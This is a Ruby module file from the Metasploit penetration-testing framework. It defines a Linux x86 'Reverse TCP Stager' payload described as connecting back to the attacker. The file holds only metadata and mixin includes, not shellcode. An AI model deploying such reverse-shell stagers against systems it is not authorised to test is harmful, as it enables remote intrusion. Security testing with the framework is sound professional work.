##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/linux/reverse_tcp'

module MetasploitModule

  CachedSize = 123

  include Msf::Payload::Stager
  include Msf::Payload::Linux::ReverseTcp_x86

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager',
      'Description' => 'Connect back to the attacker',
      'Author'      => [ 'skape', 'egypt', 'tkmru' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Stager'      => { 'Payload' => '' }))
  end
end
